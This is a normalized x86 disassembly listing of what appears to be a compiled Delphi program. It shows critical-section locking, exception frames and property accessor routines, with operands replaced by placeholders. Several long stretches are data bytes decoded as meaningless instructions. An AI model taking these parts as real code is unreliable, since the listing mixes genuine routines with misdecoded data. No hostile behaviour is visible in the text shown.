mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4104e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104ee
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410588
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403354
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4105b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410658
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e6c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_410668
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41073e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410721
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e74
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410728
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031f0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4042d8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407e18
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410758
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4107c7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107ce
retn
call sub_41030c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405034
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
call sub_404074
mov eax rw-data
call sub_40ebd8
sub_4107d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410871
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410878
retn
mov eax rw-data
call sub_4102dc
mov eax sub_40e8d8
mov [ rw-data ] eax
mov eax sub_40e500
mov [ rw-data ] eax
mov edx sub_40e410
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ebd8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ffd0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eeec
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f218
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f940
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_41087c
inc esi
dec eax
add [ ebx + 0x640000ff ] ch
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] ch
dec eax
add [ ebp + 0x640000ff ] ch
inc esi
dec eax
add [ esi + 0x640000ff ] ch
inc esi
dec eax
add [ edi + 0x640000ff ] ch
inc esi
dec eax
add [ eax + 0x640000ff ] dl
inc esi
dec eax
add [ ecx + 0x640000ff ] dl
inc esi
dec eax
add [ edx + 0x640000ff ] dl
inc esi
dec eax
add [ ebx + 0x640000ff ] dl
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
inc esi
dec eax
add [ esi + 0x640000ff ] dl
inc esi
dec eax
add [ edi + 0x640000ff ] dl
inc esi
dec eax
add [ eax + 0x640000ff ] bl
inc esi
dec eax
add [ ecx + 0x640000ff ] bl
inc esi
dec eax
add [ edx + 0x640000ff ] bl
inc esi
dec eax
add [ ebx + 0x640000ff ] bl
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
inc esi
dec eax
add [ esi + 0x640000ff ] bl
inc esi
dec eax
add [ edi + 0x640000ff ] bl
inc esi
dec eax
add [ eax + 0x640000ff ] al
inc esi
dec eax
add [ ecx + 0x640000ff ] al
inc esi
dec eax
add [ edx + 0x640000ff ] al
inc esi
dec eax
add [ ebx + 0x640000ff ] al
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] al
dec eax
add [ ebp + 0x640000ff ] al
inc esi
dec eax
add [ esi + 0x640000ff ] al
inc esi
dec eax
add [ edi + 0x640000ff ] al
inc esi
dec eax
add [ eax + 0x640000ff ] cl
inc esi
dec eax
add [ ecx + 0x640000ff ] cl
inc esi
dec eax
add [ edx + 0x640000ff ] cl
inc esi
dec eax
add [ ebx + 0x640000ff ] cl
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] cl
dec eax
add [ ebp + 0x640000ff ] cl
inc esi
dec eax
add [ esi + 0x640000ff ] cl
inc esi
dec eax
add [ edi + 0x640000ff ] cl
inc esi
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4109d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109d8
retn
sub_410a1c
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410a68
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410a10
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408188
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410a1c
mov edx [ rw-data ]
mov eax esi
call sub_407e18
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407e18
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408188
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410acc
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410b3c
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410bb0
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410c0c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410c60
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404310
mov ecx esp
mov edx esi
mov eax ebx
call sub_410c0c
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410ca8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410c94
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410ce8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410d30
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4048a0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d37
lea eax [ ebp - 0x4 ]
call sub_404754
retn
sub_410d40
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410c60
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410ca8
pop ebx
retn
dec bl
je r-xdata
call sub_410ce8
jmp r-xdata
pop ebx
retn
sub_410d6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410e32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4042fc
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410d40
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e39
lea eax [ ebp - 0xc ]
call sub_404074
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404790
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410e40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410a10
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410e88 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410fb7 ]
jmp [ eax * 4 + jump_table_410f24 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_41104c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_411038
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41108c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4110c4
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_411100
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4056f8
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411174
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4111ba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4111c1
retn
mov eax rw-data
call sub_404074
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404afc
sub_4111cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4111f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4111f8
retn
sub_411ab1
call esp
inc ebp
inc ecx
add [ eax * 2 + 0x540b0041 ] ah
push eax
jb r-xdata
add [ esi + 0x15 ] al
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
nop
sbb eax [ ecx ]
and [ ebx ] ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffbee5 ] ah
imul esi [ ebx + 0x74 ] 0x8b746e65
ror ah 0x1a
inc ecx
add [ edi ] al
or edx [ eax + edx * 2 + 0x65 ]
jb r-xdata
push esp
sbb al [ ecx ]
call 0xfffffffff4415c5d
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl 0x1b
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push esp
sbb al [ ecx ]
call 0xffffffffd8415ba9
inc ebp
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
or [ ecx + eax * 2 ] al
sbb [ ebp + 0x41 ] al
add [ eax ] ah
inc ebp
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax + 0x46 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ ecx ] ah
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffcc00411b ]
imul esi [ ebx + 0x74 ] 0xa0746e65
sbb al [ ecx ]
hlt
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
les eax [ edi + 0x41 ]
imul esi [ ebx + 0x74 ] 0xcc746e65
sbb eax [ ecx ]
pop es
adc eax 0x746e4954
jb r-xdata
add [ eax ] bl
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax ] dh
dec eax
inc ecx
add [ edx + esi + 0x40 ] dl
add ah al
inc edi
inc ecx
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] dl
dec ecx
inc ecx
add [ eax + 0x49 ] al
inc ecx
add [ eax ] bh
dec ecx
inc ecx
add [ edi + eax * 2 + 0x20041 ] cl
xor [ eax + 0x41 ] cl
imul esi [ ebx + 0x74 ] 0x90746e65
sbb eax [ ecx ]
enter 0x411a 0x0
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x41 ] ah
add [ edx + 0x1c ] dh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_411ba4
add [ eax ] al
add [ eax ] eax
add [ eax ] al
adc al 0x11
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
push esp
sbb al [ ecx ]
call 0xfffffffff4415c5d
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
les eax [ edi + 0x41 ]
imul esi [ ebx + 0x74 ] 0xcc746e65
sbb eax [ ecx ]
pop es
adc eax 0x746e4954
jb r-xdata
add [ eax ] bl
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax ] dh
dec eax
inc ecx
add [ edx + esi + 0x40 ] dl
add ah al
inc edi
inc ecx
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] dl
dec ecx
inc ecx
add [ eax + 0x49 ] al
inc ecx
add [ eax ] bh
dec ecx
inc ecx
add [ edi + eax * 2 + 0x20041 ] cl
xor [ eax + 0x41 ] cl
imul esi [ ebx + 0x74 ] 0x90746e65
sbb eax [ ecx ]
enter 0x411a 0x0
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x41 ] ah
add [ edx + 0x1c ] dh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_411df8
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
cld
outsb
dec ecx
je r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax - 0x4fffbfce ] dl
pop esi
imul ebp [ esi + 0x67 ] 0x7473694c
or al 0x1f
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
dec esp
inc ecx
add ah dh
dec ebx
inc ecx
add al dl
pop edx
inc ecx
add [ ebx + ebx * 2 ] al
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add al ah
dec edi
inc ecx
add [ eax - 0x23ffbea4 ] al
pop esp
inc ecx
add [ eax - 0x5fffbea3 ] dh
push esi
inc ecx
add ah ch
pop ebp
inc ecx
add [ eax + 0x5e ] ah
inc ecx
add [ eax + ebx * 2 + 0x58900041 ] al
inc ecx
add [ ebx + ecx * 2 ] bh
inc ecx
add [ ecx + ebx * 2 ] ch
inc ecx
add [ ecx + ebx * 2 + 0x41 ] ch
add al bl
pop ecx
inc ecx
add [ edi + ecx * 2 + 0x5b680041 ] cl
inc ecx
add [ ecx + edx * 2 + 0x52680041 ] dl
inc ecx
add [ ebx + ebx * 2 + 0x5bb40041 ] ah
inc ecx
add ah cl
push edx
inc ecx
add [ eax ] ah
push ebx
inc ecx
add ah cl
push ebx
inc ecx
add [ ebp + edx * 2 + 0x41 ] ah
add [ ebp + edx * 2 + 0x56500041 ] bh
inc ecx
add ah dh
pop eax
inc ecx
add [ eax ] dl
pop ecx
inc ecx
add [ eax ] cl
pop esp
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ eax ] bl
pop esi
inc ecx
add [ eax ] ch
pop esi
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
push ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ds
inc ecx
add [ eax ] dh
add [ eax ] al
add al ch
sbb al 0x41
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub [ eax + 0x41 ] bl
add [ eax ] bl
inc ebp
inc ecx
add ah bh
add [ eax - 0xbffbea2 ] dh
popad
inc ecx
add ah bh
pop esi
inc ecx
add [ edi + ebx * 2 ] dl
inc ecx
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
mov ah 0x5f
inc ecx
add [ eax ] bh
pushad
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
mov al 0x5e
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
rcr [ 0x41 ] 0x1
pop es
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
mov [ eax ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80041 ] ah
add [ eax ] al
les ebx [ edi ]
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
enter 0x4164 0x0
mov al 0x5e
inc ecx
add ah dh
bound eax [ ecx ]
or [ ebx + 0x41 ] ah
add [ eax - 0x47ffbe9e ] ch
bound eax [ ecx ]
